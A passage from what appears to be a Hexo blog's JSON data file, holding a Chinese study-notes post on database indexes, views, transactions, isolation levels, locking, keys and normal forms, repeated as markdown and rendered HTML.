当我们有一张表示银行中每个人借贷记录的表，我们需要知道这张表里面的部分信息，而不是全部信息，基于安全原因，我们会给用户透漏诸如借贷人姓名、借贷号，而不给用户透漏借贷量，我们就需要定义一个查询语句，只返回这张表的部分信息。此外我们可能需要其他的信息，而这些信息需要union多张表，但是这样的信息查询又是比较频繁的，我们也需要定义一个查询语句，来返回结果。\n\n基于上述的例子，作者就引出了视图的概念。而我对于这个的理解是：我们需要基于两方面考虑，**一个是安全性**，当我们在使用mysql数据库的时候，数据库里面总是有一些视图表，里面包含了当前用户的所有数据库信息，诸如有哪些表，表里都有哪些属性这类信息。所有的可视范围在于当前用户的权限之内，权限之外就无法查看到，那么可以使用视图定义一个查询，根据用户权限，返回整个数据库中用户应该看到的东西。**另一个考虑是简单性**，我的理解是当我们需要较频繁进行一些查询时，我们总是要频繁的编写复杂的查询语句，为了简化，我们把这些频繁查询进行一定程度的封装，给用户展示一个简单的视图名，让用户能够直截了当的理解这个视图的作用，然后直接查询视图结果。\n\n(这一段是我自己的理解，可能有误解)可能有人会这样选择，上述为了简化查询，为什么要使用视图，不直接使用新表，新表的构建通过其他表变化触发。如果我们使用表，那么我们可能要为每个频繁查找的语句创建一个合适的表，这样的后果是，数据库的表增多，而且表与表之间的关系更加复杂。虽然我们在学习数据库的时候常常让其遵守三范式，但这样会导致如果因为前期表的设计有问题，或者后期需要变化表，那么修改起来是一个非常巨大的工程，非常困难。相反视图并不在数据库中以存储的数据值集形式存在，修改起来是很方便的。\n\n此外可能还有一个经常被问的问题是**视图什么时候更新？因为视图是一种虚关系，所以是查询时更新，通俗一点就是，当底层的表有修改时，是去触发视图更新，还是当我们要用使用视图的时候更新。答案是后者，因为实质上视图还是一个查询语句，而不是表，每次使用视图，都需要重新执行视图定义的查询**\n## 事务\n### 事务概念\n**事务**是访问并可能更新各种数据项的一个程序执行单元。我们通常要求数据库系统维护事务的以下性质\n- **原子性(Atom)**：事务的所有操作在数据库中要么全部正确反映出来，要么完全不反映。\n- **一致性(Consistency)**：隔离执行事务时(换言之，在没有其他事务并发执行的情况下)保持数据库的一致性\n- **隔离性(Isolation)**：尽管多个事务可能并发执行，但是系统保证，对于任何一对事务Ti和Tj，在Ti看来，Tj要么Ti开始之前已经完成执行，要么在Ti完成孩子后开始执行。因此，每个事务都感觉不到系统中有其他事务在并发地执行。\n- **持久性(Durability)**：一个事务成功完成后，它对数据库的改变必须是永久的，即使出现系统故障。\n\n这些性质通常成为ACID特性\n\n### 事务隔离级别\n- **可串行化(serializable)** : 通常保证可串行化调度。然而正如我们将要解释的，一些数据库系统对该隔离性级别的实现在某些情况下允许非可串行化执行。\n- **可重复读(repeatable read)** : 只允许读取已经提交数据，而且在一个事务两次读取一个数据项期间，其他事务不得更新该数据。但该事务不要求与其他事务可串行化。\n- **已提交读(read committed)** : 只允许读取已提交数据，但不要求可重复度。比如在事务两次读取一个数据项期间，另一个事务更新了该数据并提交。\n- **未提交读(read uncommitted)** : 允许读取未提交数据。这是SQL允许的最低一致性级别。\n\n### 乐观锁和悲观锁\n为保持数据库事务的隔离性，系统必须对并发事务之间的相互作用加以控制。乐观并发控制(乐观锁)和悲观并发控制(悲观锁)是并发控制主要采用的手段。\n- **乐观锁** : 假定不会发生并发冲突，只是在提交操作时检查是否违反了数据完整性。\n- **悲观锁** : 假定会发生并发冲突，屏蔽一切可能违反数据完整性操作。\n\n> 补充说明一下，对于悲观锁来说，如果一个事务操作对一个资源应用了锁时，其他事务只能等待该事务解锁后，再尝试对资源上锁。悲观锁主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护的成本低于回滚事务的成本环境中。\n\n> 相对于悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发生冲突了，则返回用户错误的信息，让用户决定如何去做。\n\n## DELETE、DROP、TRUNCATE\n- 想要彻底删除一张表时用drop\n- 想要删除表中的部分数据用delete并带上where\n- 想要删除表中数据而保留表用truncate\n\n## 超键、候选键、主键、外键分别是什么\n- 超键：在关系中能唯一标识元组的属性集。一个属性可以作为一个超键，多个属性组合在一起也可以作为一个超键\n- 候选键：最小超键，即没有冗余的超键\n- 主键：唯一表示一个元组的键，每个表只有一个主键，且主键不能为空\n- 一个表中存这另一个表的主键，这个键被成为外键\n\n## 三范式\n- 1NF : 保证数据库表的字段不可再拆分，原子性\n- 2NF : 不包括部分依赖，即没有属性只依赖主码的一部分\n- 3NF : 表中不存在可以确定其他非关键字的非键字段\n\n补充\n> 1NF 消除非主属性对码的部分函数依赖就是 2NF\n> 2NF 消除非主属性对码的传递函数依赖就是 3NF\n> 3NF 消除了主属性对码的部分和传递函数依赖就是 BCNF\n\n## 个人声明\n由于文章里面的图片基本上都是在网上找的，所以可能会出现一段时间后，图片链接失效了，无法显示，如果出现这种情况，请给我留言!!!\n谢谢!!!","source":"_posts/数据库各要点总结.md","raw":"---\ntitle: 数据库大杂烩\ndate: 2018-04-13 15:18:23\ncategories: 数据库\ntags:\n  - SQL\n  - 索引\n---\n\n## 索引\n### 顺序索引\n`聚集索引`：　如果包含记录的文件按照某个搜索码指定的顺序排序，那么该搜索码对应的索引称为聚集索引。\n`非聚集索引`：　搜索码指定的顺序与文件中记录的物理顺序不同的索引称为非聚集索引。\n\n诸如在大学教师记录文件中，用教师ID作为搜索码，记录按照该搜索码顺序存放。\n\n`稠密索引(dense index)` : **在稠密索引中，文件中的每一个搜索码值都有一个索引项**。在稠密聚集索引中，索引项包括搜索码值以及指向具有该搜索码的第一条数据记录的指针。具有相同搜索码值的其余记录顺序地存储在第一条数据记录之后，由于该索引是聚集索引，因此记录根据相同的搜索码值排序。而在稠密非聚集索引中，索引必须存储指向所有具有相同搜索码值的记录项的指针列表。\n> 稠密聚集索引具有相同搜索码值的记录按照指定顺序存储；但是稠密非聚集索引必须存储指向一个指针列表，这个列表里面有具有相同搜索码值的记录指针。聚集索引只存储第一条记录的指针，其他的按照顺序查找，非聚集索引就要记录一个指针表。\n\n![Dense index](http://www.assignmenthelp.net/assignment_help/images/dense-index-architecture.gif)\n\n<!--more-->\n\n`稀疏索引(sparse index)`： **在稀疏索引中，只为搜索码的某些值建立索引索引项**。只有当记录按照搜索码排列顺序存储时才能使用稀疏索引，也就是说，只有索引是聚集索引时才能使用稀疏索引。和稠密索引一样，每个索引项也包括一个搜索码值和指向该搜索码值的第一条记录的指针。为了定位一条记录，我们获取查询记录的搜索码值，再比较索引项中等于或者小于其搜索码值的最大项，然后从该索引项指向的记录开始，沿着文件中的指针查找，直到找到所需记录为止。\n\n![Sparse index](http://www.assignmenthelp.net/assignment_help/images/sparse-index-architecture.gif)\n\n> 就像图中，索引项中没有为每个搜索码(即右边表格中第二列)设立索引项，但这需要保证这些记录按照搜索码顺序排列才行。\n\n`多级索引`：在外层构建稀疏索引，通过二分查找找到外层索引，外层索引指向内层索引表，内层索引表再找到指定的索引项，最后去定位到记录。\n![Two-level index](http://www.cs.montana.edu/~halla/csci440/n18/figure-18-6.png)\n\n`辅助索引`：　按聚集索引顺序对文件进行顺序扫描是非常有效的，因为文件中记录的物理存储顺序和索引顺序一致。但是当我们新建立一个索引，而这个索引的顺序跟记录的物理存储顺序不一致时，我们就需要一个辅助索引，这个辅助索引指向每一条记录，这个辅助索引的顺序跟我们要新建的索引顺序一致。\n\n![Secondary index](https://raw.githubusercontent.com/alexeygrigorev/wiki-figures/master/ulb/dbsa/ind/secondary-dense-sparse.png)\n\n> 从图里面可以看到，我们新建的索引跟blocks的物理存储顺序不一致，为了解决这个问题，中间添加一个辅助索引，这个辅助索引是稠密索引，同时也根据我们新建索引的顺序进行排序。\n\n### B+树索引\n![B+ tree](https://turing.cs.hbg.psu.edu/courses/comp419.taw.s97/btree.gif)\n索引顺序文件组织的最大缺点在于，随着文件的增大，索引查找性能和数据顺序扫面性能都会下降。虽然这种性能下降可以通过对文件进行重新组织来弥补，但是我们不希望频繁地进行重组。\n\nB+树(B+ -tress)索引结构是在数据插入和删除的情况下仍能保持其执行效率的几种使用最广泛的索引结构之一。B+树索引采用平衡树结构，其中树根到树叶的每条路径的长度相同。树中每个非叶子节点有n/2~n个子女，其中n对特定的树是固定的。\nB+树索引是一种多级索引，但是其结构不同与多级索引顺序文件。典型的B+树结点结构如下 :\n\n![Internal node](http://4.bp.blogspot.com/-LQ2cFeN3_HI/Uy8TXyI0eOI/AAAAAAAACP0/bGH5v8JAPjU/s1600/Structure+of+an+internal+node+of+B++tree.jpg)\n\n> 这是内部结点结构\n\n![leaf node](http://2.bp.blogspot.com/--7OpPitZhoQ/Uy8TVPCxenI/AAAAAAAACPs/lUkMHUTlM2g/s1600/Structure+of+a+leaf+node+of+B++tree.jpg)\n\n> 这是叶子结点结构，其中key都表示搜索码值，而叶子节点的指针是指向记录块(或者是记录行)，而内部结点是指向下一层的结点。\n> 注意到叶子结点只使用了n-1个指针来指向记录，最后一个指针指向自己的兄弟结点，即下一个叶子节点，这样是为了将所有的叶子节点串起来，这样可以发现从最左边的节点开始，可以按照搜索码顺序遍历所有记录行，这为按顺序查找所有记录的SQL语句提供了更加高效的方式。\n\n### B树索引\n![B tree](http://www.assignmenthelp.net/assignment_help/images/implementation-B_plus_tree.gif)\nB树索引和B+树索引相似。**两种方法的主要区别在于B树去除了搜索码值存储中冗余**。在上面展示的B+树索引中可以看到搜索码3在结点中出现了两次，每个搜索码值都出现在某些叶子结点中，有的还在非叶子结点中重复出现。\n\n在B+树中，搜索码值可能同时出现在非叶子结点和叶子结点中。与B+树不同，B树只允许搜索码值出现一次(如果它们是唯一的)。由于B树中搜索码不重复，因此可以用比相应B+树索引更少的树结点来存储索引。然而在B树中，由于出现在非叶子中的搜索码值不会出现在其他地方，因此我们将不得不在非叶子节点中为每个搜索码增加一个指针域。附加的这些指针指向文件记录或相应搜索码所对应的桶中。\n\nB树叶子结点跟B+树叶子结点一样，不同在于非叶子结点 :\n![](http://www.assignmenthelp.net/assignment_help/images/B-tree-index-files-assignment-help.gif)\n\n### 散列索引\n借鉴`Java HashMap`的具体实现细节，通过仔细了解`HashMap`可以更加深入了解散列索引。在此推荐一篇讲述`HashMap`比较好的文章  [Java HashMap工作原理及实现](https://yikun.github.io/2015/04/01/Java-HashMap%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/)\n\n### 位图索引\n![Bitmap index](https://mjromeo.files.wordpress.com/2017/01/bitmap_index_example.png?w=646)\n\n简单解释一下，在图中可以发现`gender`记录项只有m、f两个值，那么系统为这两个值分别建立一个位图，对于m位图来说，记录有多少，位图就有多少位，只有当第i个记录`gender`为m时，m位图的第i位为1,其他不是m的记录位全为零。概括的说，位图就是表示某一搜索码值出现在了哪些位置，通过遍历搜索码值的位图来查找，诸如下列SQL语句\n``` SQL\nSELECT * FROM r WHERE gender = 'f'\n```\n这样的查询语句通过遍历f的位图是非常高效的。但是位图只是适用于搜索码值频繁出现，且选项少，这里所说的选项少是指比如记录人的性别只有三个选项:`男`、`女`、`不知道`，这样使用位图再适合不过了。通常情况下，位图可以和一般的B+树索引组合起来使用。\n\n### MySQL数据库几个基本的索引类型\n- **普通索引** : 这是最基本的MySQL数据库索引，它没有任何限制。\n- **唯一索引** : 它与前面的普通索引类似，不同的就是：MySQL数据库索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。\n- **主键索引** : 它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引。\n- **组合索引** : 多字段建立索引。\n\n## 视图\n视图这么一个概念我一直不太准确理解，各种参考书上说得太正式，导致我越来越蒙。来我们看一看视图的定义：\n\n**Any relation that is not part of the logical model, but is made visiable to an user as a virtual relation, is called a `view`**\n翻译过来就是**任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系成为视图**\n\n在`Database System Concepts`这本书里面，作者通过一个例子来引出概念，这个例子如下：\n> 当我们有一张表示银行中每个人借贷记录的表，我们需要知道这张表里面的部分信息，而不是全部信息，基于安全原因，我们会给用户透漏诸如借贷人姓名、借贷号，而不给用户透漏借贷量，我们就需要定义一个查询语句，只返回这张表的部分信息。此外我们可能需要其他的信息，而这些信息需要union多张表，但是这样的信息查询又是比较频繁的，我们也需要定义一个查询语句，来返回结果。\n\n基于上述的例子，作者就引出了视图的概念。而我对于这个的理解是：我们需要基于两方面考虑，**一个是安全性**，当我们在使用mysql数据库的时候，数据库里面总是有一些视图表，里面包含了当前用户的所有数据库信息，诸如有哪些表，表里都有哪些属性这类信息。所有的可视范围在于当前用户的权限之内，权限之外就无法查看到，那么可以使用视图定义一个查询，根据用户权限，返回整个数据库中用户应该看到的东西。**另一个考虑是简单性**，我的理解是当我们需要较频繁进行一些查询时，我们总是要频繁的编写复杂的查询语句，为了简化，我们把这些频繁查询进行一定程度的封装，给用户展示一个简单的视图名，让用户能够直截了当的理解这个视图的作用，然后直接查询视图结果。\n\n(这一段是我自己的理解，可能有误解)可能有人会这样选择，上述为了简化查询，为什么要使用视图，不直接使用新表，新表的构建通过其他表变化触发。如果我们使用表，那么我们可能要为每个频繁查找的语句创建一个合适的表，这样的后果是，数据库的表增多，而且表与表之间的关系更加复杂。虽然我们在学习数据库的时候常常让其遵守三范式，但这样会导致如果因为前期表的设计有问题，或者后期需要变化表，那么修改起来是一个非常巨大的工程，非常困难。相反视图并不在数据库中以存储的数据值集形式存在，修改起来是很方便的。\n\n此外可能还有一个经常被问的问题是**视图什么时候更新？因为视图是一种虚关系，所以是查询时更新，通俗一点就是，当底层的表有修改时，是去触发视图更新，还是当我们要用使用视图的时候更新。答案是后者，因为实质上视图还是一个查询语句，而不是表，每次使用视图，都需要重新执行视图定义的查询**\n## 事务\n### 事务概念\n**事务**是访问并可能更新各种数据项的一个程序执行单元。我们通常要求数据库系统维护事务的以下性质\n- **原子性(Atom)**：事务的所有操作在数据库中要么全部正确反映出来，要么完全不反映。\n- **一致性(Consistency)**：隔离执行事务时(换言之，在没有其他事务并发执行的情况下)保持数据库的一致性\n- **隔离性(Isolation)**：尽管多个事务可能并发执行，但是系统保证，对于任何一对事务Ti和Tj，在Ti看来，Tj要么Ti开始之前已经完成执行，要么在Ti完成孩子后开始执行。因此，每个事务都感觉不到系统中有其他事务在并发地执行。\n- **持久性(Durability)**：一个事务成功完成后，它对数据库的改变必须是永久的，即使出现系统故障。\n\n这些性质通常成为ACID特性\n\n### 事务隔离级别\n- **可串行化(serializable)** : 通常保证可串行化调度。然而正如我们将要解释的，一些数据库系统对该隔离性级别的实现在某些情况下允许非可串行化执行。\n- **可重复读(repeatable read)** : 只允许读取已经提交数据，而且在一个事务两次读取一个数据项期间，其他事务不得更新该数据。但该事务不要求与其他事务可串行化。\n- **已提交读(read committed)** : 只允许读取已提交数据，但不要求可重复度。比如在事务两次读取一个数据项期间，另一个事务更新了该数据并提交。\n- **未提交读(read uncommitted)** : 允许读取未提交数据。这是SQL允许的最低一致性级别。\n\n### 乐观锁和悲观锁\n为保持数据库事务的隔离性，系统必须对并发事务之间的相互作用加以控制。乐观并发控制(乐观锁)和悲观并发控制(悲观锁)是并发控制主要采用的手段。\n- **乐观锁** : 假定不会发生并发冲突，只是在提交操作时检查是否违反了数据完整性。\n- **悲观锁** : 假定会发生并发冲突，屏蔽一切可能违反数据完整性操作。\n\n> 补充说明一下，对于悲观锁来说，如果一个事务操作对一个资源应用了锁时，其他事务只能等待该事务解锁后，再尝试对资源上锁。悲观锁主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护的成本低于回滚事务的成本环境中。\n\n> 相对于悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发生冲突了，则返回用户错误的信息，让用户决定如何去做。\n\n## DELETE、DROP、TRUNCATE\n- 想要彻底删除一张表时用drop\n- 想要删除表中的部分数据用delete并带上where\n- 想要删除表中数据而保留表用truncate\n\n## 超键、候选键、主键、外键分别是什么\n- 超键：在关系中能唯一标识元组的属性集。一个属性可以作为一个超键，多个属性组合在一起也可以作为一个超键\n- 候选键：最小超键，即没有冗余的超键\n- 主键：唯一表示一个元组的键，每个表只有一个主键，且主键不能为空\n- 一个表中存这另一个表的主键，这个键被成为外键\n\n## 三范式\n- 1NF : 保证数据库表的字段不可再拆分，原子性\n- 2NF : 不包括部分依赖，即没有属性只依赖主码的一部分\n- 3NF : 表中不存在可以确定其他非关键字的非键字段\n\n补充\n> 1NF 消除非主属性对码的部分函数依赖就是 2NF\n> 2NF 消除非主属性对码的传递函数依赖就是 3NF\n> 3NF 消除了主属性对码的部分和传递函数依赖就是 BCNF\n\n## 个人声明\n由于文章里面的图片基本上都是在网上找的，所以可能会出现一段时间后，图片链接失效了，无法显示，如果出现这种情况，请给我留言!!!\n谢谢!!!","slug":"数据库各要点总结","published":1,"updated":"2018-04-14T13:21:39.387Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjsd0f003pyp0l59k0567o","content":"<h2 id=\"索引\"><a href=\"#索引\" class=\"headerlink\" title=\"索引\"></a>索引</h2><h3 id=\"顺序索引\"><a href=\"#顺序索引\" class=\"headerlink\" title=\"顺序索引\"></a>顺序索引</h3><p><code>聚集索引</code>：　如果包含记录的文件按照某个搜索码指定的顺序排序，那么该搜索码对应的索引称为聚集索引。<br><code>非聚集索引</code>：　搜索码指定的顺序与文件中记录的物理顺序不同的索引称为非聚集索引。</p>\n<p>诸如在大学教师记录文件中，用教师ID作为搜索码，记录按照该搜索码顺序存放。</p>\n<p><code>稠密索引(dense index)</code> : <strong>在稠密索引中，文件中的每一个搜索码值都有一个索引项</strong>。在稠密聚集索引中，索引项包括搜索码值以及指向具有该搜索码的第一条数据记录的指针。具有相同搜索码值的其余记录顺序地存储在第一条数据记录之后，由于该索引是聚集索引，因此记录根据相同的搜索码值排序。而在稠密非聚集索引中，索引必须存储指向所有具有相同搜索码值的记录项的指针列表。</p>\n<blockquote>\n<p>稠密聚集索引具有相同搜索码值的记录按照指定顺序存储；但是稠密非聚集索引必须存储指向一个指针列表，这个列表里面有具有相同搜索码值的记录指针。聚集索引只存储第一条记录的指针，其他的按照顺序查找，非聚集索引就要记录一个指针表。</p>\n</blockquote>\n<p><img src=\"http://www.assignmenthelp.net/assignment_help/images/dense-index-architecture.gif\" alt=\"Dense index\"></p>\n<a id=\"more\"></a>\n<p><code>稀疏索引(sparse index)</code>： <strong>在稀疏索引中，只为搜索码的某些值建立索引索引项</strong>。只有当记录按照搜索码排列顺序存储时才能使用稀疏索引，也就是说，只有索引是聚集索引时才能使用稀疏索引。和稠密索引一样，每个索引项也包括一个搜索码值和指向该搜索码值的第一条记录的指针。为了定位一条记录，我们获取查询记录的搜索码值，再比较索引项中等于或者小于其搜索码值的最大项，然后从该索引项指向的记录开始，沿着文件中的指针查找，直到找到所需记录为止。</p>\n<p><img src=\"http://www.assignmenthelp.net/assignment_help/images/sparse-index-architecture.gif\" alt=\"Sparse index\"></p>\n<blockquote>\n<p>就像图中，索引项中没有为每个搜索码(即右边表格中第二列)设立索引项，但这需要保证这些记录按照搜索码顺序排列才行。</p>\n</blockquote>\n<p><code>多级索引</code>：在外层构建稀疏索引，通过二分查找找到外层索引，外层索引指向内层索引表，内层索引表再找到指定的索引项，最后去定位到记录。<br><img src=\"http://www.cs.montana.edu/~halla/csci440/n18/figure-18-6.png\" alt=\"Two-level index\"></p>\n<p><code>辅助索引</code>：　按聚集索引顺序对文件进行顺序扫描是非常有效的，因为文件中记录的物理存储顺序和索引顺序一致。但是当我们新建立一个索引，而这个索引的顺序跟记录的物理存储顺序不一致时，我们就需要一个辅助索引，这个辅助索引指向每一条记录，这个辅助索引的顺序跟我们要新建的索引顺序一致。</p>\n<p><img src=\"https://raw.githubusercontent.com/alexeygrigorev/wiki-figures/master/ulb/dbsa/ind/secondary-dense-sparse.png\" alt=\"Secondary index\"></p>\n<blockquote>\n<p>从图里面可以看到，我们新建的索引跟blocks的物理存储顺序不一致，为了解决这个问题，中间添加一个辅助索引，这个辅助索引是稠密索引，同时也根据我们新建索引的顺序进行排序。</p>\n</blockquote>\n<h3 id=\"B-树索引\"><a href=\"#B-树索引\" class=\"headerlink\" title=\"B+树索引\"></a>B+树索引</h3><p><img src=\"https://turing.cs.hbg.psu.edu/courses/comp419.taw.s97/btree.gif\" alt=\"B+ tree\"><br>索引顺序文件组织的最大缺点在于，随着文件的增大，索引查找性能和数据顺序扫面性能都会下降。虽然这种性能下降可以通过对文件进行重新组织来弥补，但是我们不希望频繁地进行重组。</p>\n<p>B+树(B+ -tress)索引结构是在数据插入和删除的情况下仍能保持其执行效率的几种使用最广泛的索引结构之一。B+树索引采用平衡树结构，其中树根到树叶的每条路径的长度相同。树中每个非叶子节点有n/2~n个子女，其中n对特定的树是固定的。<br>B+树索引是一种多级索引，但是其结构不同与多级索引顺序文件。典型的B+树结点结构如下 :</p>\n<p><img src=\"http://4.bp.blogspot.com/-LQ2cFeN3_HI/Uy8TXyI0eOI/AAAAAAAACP0/bGH5v8JAPjU/s1600/Structure+of+an+internal+node+of+B++tree.jpg\" alt=\"Internal node\"></p>\n<blockquote>\n<p>这是内部结点结构</p>\n</blockquote>\n<p><img src=\"http://2.bp.blogspot.com/--7OpPitZhoQ/Uy8TVPCxenI/AAAAAAAACPs/lUkMHUTlM2g/s1600/Structure+of+a+leaf+node+of+B++tree.jpg\" alt=\"leaf node\"></p>\n<blockquote>\n<p>这是叶子结点结构，其中key都表示搜索码值，而叶子节点的指针是指向记录块(或者是记录行)，而内部结点是指向下一层的结点。<br>注意到叶子结点只使用了n-1个指针来指向记录，最后一个指针指向自己的兄弟结点，即下一个叶子节点，这样是为了将所有的叶子节点串起来，这样可以发现从最左边的节点开始，可以按照搜索码顺序遍历所有记录行，这为按顺序查找所有记录的SQL语句提供了更加高效的方式。</p>\n</blockquote>\n<h3 id=\"B树索引\"><a href=\"#B树索引\" class=\"headerlink\" title=\"B树索引\"></a>B树索引</h3><p><img src=\"http://www.assignmenthelp.net/assignment_help/images/implementation-B_plus_tree.gif\" alt=\"B tree\"><br>B树索引和B+树索引相似。<strong>两种方法的主要区别在于B树去除了搜索码值存储中冗余</strong>。在上面展示的B+树索引中可以看到搜索码3在结点中出现了两次，每个搜索码值都出现在某些叶子结点中，有的还在非叶子结点中重复出现。</p>\n<p>在B+树中，搜索码值可能同时出现在非叶子结点和叶子结点中。与B+树不同，B树只允许搜索码值出现一次(如果它们是唯一的)。由于B树中搜索码不重复，因此可以用比相应B+树索引更少的树结点来存储索引。然而在B树中，由于出现在非叶子中的搜索码值不会出现在其他地方，因此我们将不得不在非叶子节点中为每个搜索码增加一个指针域。附加的这些指针指向文件记录或相应搜索码所对应的桶中。</p>\n<p>B树叶子结点跟B+树叶子结点一样，不同在于非叶子结点 :<br><img src=\"http://www.assignmenthelp.net/assignment_help/images/B-tree-index-files-assignment-help.gif\" alt=\"\"></p>\n<h3 id=\"散列索引\"><a href=\"#散列索引\" class=\"headerlink\" title=\"散列索引\"></a>散列索引</h3><p>借鉴<code>Java HashMap</code>的具体实现细节，通过仔细了解<code>HashMap</code>可以更加深入了解散列索引。在此推荐一篇讲述<code>HashMap</code>比较好的文章  <a href=\"https://yikun.github.io/2015/04/01/Java-HashMap%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E7%8E%B0/\" target=\"_blank\" rel=\"external\">Java HashMap工作原理及实现</a></p>\n<h3 id=\"位图索引\"><a href=\"#位图索引\" class=\"headerlink\" title=\"位图索引\"></a>位图索引</h3><p><img src=\"https://mjromeo.files.wordpress.com/2017/01/bitmap_index_example.png?w=646\" alt=\"Bitmap index\"></p>\n<p>简单解释一下，在图中可以发现<code>gender</code>记录项只有m、f两个值，那么系统为这两个值分别建立一个位图，对于m位图来说，记录有多少，位图就有多少位，只有当第i个记录<code>gender</code>为m时，m位图的第i位为1,其他不是m的记录位全为零。概括的说，位图就是表示某一搜索码值出现在了哪些位置，通过遍历搜索码值的位图来查找，诸如下列SQL语句<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SELECT</span> * <span class=\"keyword\">FROM</span> r <span class=\"keyword\">WHERE</span> gender = <span class=\"string\">'f'</span></span><br></pre></td></tr></table></figure></p>\n<p>这样的查询语句通过遍历f的位图是非常高效的。但是位图只是适用于搜索码值频繁出现，且选项少，这里所说的选项少是指比如记录人的性别只有三个选项:<code>男</code>、<code>女</code>、<code>不知道</code>，这样使用位图再适合不过了。通常情况下，位图可以和一般的B+树索引组合起来使用。</p>\n<h3 id=\"MySQL数据库几个基本的索引类型\"><a href=\"#MySQL数据库几个基本的索引类型\" class=\"headerlink\" title=\"MySQL数据库几个基本的索引类型\"></a>MySQL数据库几个基本的索引类型</h3><ul>\n<li><strong>普通索引</strong> : 这是最基本的MySQL数据库索引，它没有任何限制。</li>\n<li><strong>唯一索引</strong> : 它与前面的普通索引类似，不同的就是：MySQL数据库索引列的值必须唯一，但允许有空值。如果是组合索引，则列值的组合必须唯一。</li>\n<li><strong>主键索引</strong> : 它是一种特殊的唯一索引，不允许有空值。一般是在建表的时候同时创建主键索引。</li>\n<li><strong>组合索引</strong> : 多字段建立索引。</li>\n</ul>\n<h2 id=\"视图\"><a href=\"#视图\" class=\"headerlink\" title=\"视图\"></a>视图</h2><p>视图这么一个概念我一直不太准确理解，各种参考书上说得太正式，导致我越来越蒙。来我们看一看视图的定义：</p>\n<p><strong>Any relation that is not part of the logical model, but is made visiable to an user as a virtual relation, is called a <code>view</code></strong><br>翻译过来就是<strong>任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系成为视图</strong></p>\n<p>在<code>Database System Concepts</code>这本书里面，作者通过一个例子来引出概念，这个例子如下：</p>\n<blockquote>\n<p>当我们有一张表示银行中每个人借贷记录的表，我们需要知道这张表里面的部分信息，而不是全部信息，基于安全原因，我们会给用户透漏诸如借贷人姓名、借贷号，而不给用户透漏借贷量，我们就需要定义一个查询语句，只返回这张表的部分信息。此外我们可能需要其他的信息，而这些信息需要union多张表，但是这样的信息查询又是比较频繁的，我们也需要定义一个查询语句，来返回结果。</p>\n</blockquote>\n<p>基于上述的例子，作者就引出了视图的概念。而我对于这个的理解是：我们需要基于两方面考虑，<strong>一个是安全性</strong>，当我们在使用mysql数据库的时候，数据库里面总是有一些视图表，里面包含了当前用户的所有数据库信息，诸如有哪些表，表里都有哪些属性这类信息。所有的可视范围在于当前用户的权限之内，权限之外就无法查看到，那么可以使用视图定义一个查询，根据用户权限，返回整个数据库中用户应该看到的东西。<strong>另一个考虑是简单性</strong>，我的理解是当我们需要较频繁进行一些查询时，我们总是要频繁的编写复杂的查询语句，为了简化，我们把这些频繁查询进行一定程度的封装，给用户展示一个简单的视图名，让用户能够直截了当的理解这个视图的作用，然后直接查询视图结果。</p>\n<p>(这一段是我自己的理解，可能有误解)可能有人会这样选择，上述为了简化查询，为什么要使用视图，不直接使用新表，新表的构建通过其他表变化触发。如果我们使用表，那么我们可能要为每个频繁查找的语句创建一个合适的表，这样的后果是，数据库的表增多，而且表与表之间的关系更加复杂。虽然我们在学习数据库的时候常常让其遵守三范式，但这样会导致如果因为前期表的设计有问题，或者后期需要变化表，那么修改起来是一个非常巨大的工程，非常困难。相反视图并不在数据库中以存储的数据值集形式存在，修改起来是很方便的。</p>\n<p>此外可能还有一个经常被问的问题是<strong>视图什么时候更新？因为视图是一种虚关系，所以是查询时更新，通俗一点就是，当底层的表有修改时，是去触发视图更新，还是当我们要用使用视图的时候更新。答案是后者，因为实质上视图还是一个查询语句，而不是表，每次使用视图，都需要重新执行视图定义的查询</strong></p>\n<h2 id=\"事务\"><a href=\"#事务\" class=\"headerlink\" title=\"事务\"></a>事务</h2><h3 id=\"事务概念\"><a href=\"#事务概念\" class=\"headerlink\" title=\"事务概念\"></a>事务概念</h3><p><strong>事务</strong>是访问并可能更新各种数据项的一个程序执行单元。我们通常要求数据库系统维护事务的以下性质</p>\n<ul>\n<li><strong>原子性(Atom)</strong>：事务的所有操作在数据库中要么全部正确反映出来，要么完全不反映。</li>\n<li><strong>一致性(Consistency)</strong>：隔离执行事务时(换言之，在没有其他事务并发执行的情况下)保持数据库的一致性</li>\n<li><strong>隔离性(Isolation)</strong>：尽管多个事务可能并发执行，但是系统保证，对于任何一对事务Ti和Tj，在Ti看来，Tj要么Ti开始之前已经完成执行，要么在Ti完成孩子后开始执行。因此，每个事务都感觉不到系统中有其他事务在并发地执行。</li>\n<li><strong>持久性(Durability)</strong>：一个事务成功完成后，它对数据库的改变必须是永久的，即使出现系统故障。</li>\n</ul>\n<p>这些性质通常成为ACID特性</p>\n<h3 id=\"事务隔离级别\"><a href=\"#事务隔离级别\" class=\"headerlink\" title=\"事务隔离级别\"></a>事务隔离级别</h3><ul>\n<li><strong>可串行化(serializable)</strong> : 通常保证可串行化调度。然而正如我们将要解释的，一些数据库系统对该隔离性级别的实现在某些情况下允许非可串行化执行。</li>\n<li><strong>可重复读(repeatable read)</strong> : 只允许读取已经提交数据，而且在一个事务两次读取一个数据项期间，其他事务不得更新该数据。但该事务不要求与其他事务可串行化。</li>\n<li><strong>已提交读(read committed)</strong> : 只允许读取已提交数据，但不要求可重复度。比如在事务两次读取一个数据项期间，另一个事务更新了该数据并提交。</li>\n<li><strong>未提交读(read uncommitted)</strong> : 允许读取未提交数据。这是SQL允许的最低一致性级别。</li>\n</ul>\n<h3 id=\"乐观锁和悲观锁\"><a href=\"#乐观锁和悲观锁\" class=\"headerlink\" 